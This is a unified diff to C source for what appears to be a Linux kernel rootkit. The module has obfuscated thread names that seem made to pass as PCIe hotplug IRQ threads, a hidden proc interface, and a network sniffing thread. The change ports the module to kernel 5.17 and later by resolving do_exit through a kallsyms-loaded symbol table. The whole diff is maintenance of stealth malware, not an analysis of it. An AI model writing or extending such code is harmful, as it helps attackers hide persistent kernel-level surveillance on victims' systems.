@@ -725,12 +725,19 @@ void kv_remove_proc_interface(void) {
 }
 
 static int _proc_watchdog(void *unused) {
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
+      struct kernel_syscalls *kaddr = kv_kall_load_addr();
+#endif
       for(;;) {
           if (kthread_should_park())
               kthread_parkme();
           if(kthread_should_stop()) {
               _proc_rm_wrapper();
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
+              kaddr->k_do_exit(0);
+#else
               do_exit(0);
+#endif
           }
           if (kv_is_proc_interface_loaded()) {
               if (proc_timeout(PRC_READ))
@@ -764,6 +771,9 @@ static int __init kv_init(void) {
 
     int rv = 0;
     char *tname, *magik, *procname_err = "";
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
+    struct kernel_syscalls *kaddr = NULL;
+#endif
 
     if (strlen(PROCNAME) == 0) {
         procname_err = "Empty PROCNAME build parameter. Check Makefile.";
@@ -790,10 +800,16 @@ static int __init kv_init(void) {
         goto sys_init_error;
 
     tname = kv_whatever_getstr(_OBF_IRQ_100_PCIEHP, sizeof(_OBF_IRQ_100_PCIEHP));
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
+    kaddr = kv_kall_load_addr();
+    if (!kaddr || !kaddr->k_do_exit)
+        goto cont;
+#endif
     tsk_prc = kthread_run(_proc_watchdog, NULL, tname);
     if (!tsk_prc)
         goto unroll_init;
 
+cont:
     tname = kv_whatever_getstr(_OBF_IRQ_101_PCIEHP, sizeof(_OBF_IRQ_101_PCIEHP));
     tsk_sniff = kv_sock_start_sniff(tname);
     if (!tsk_sniff)
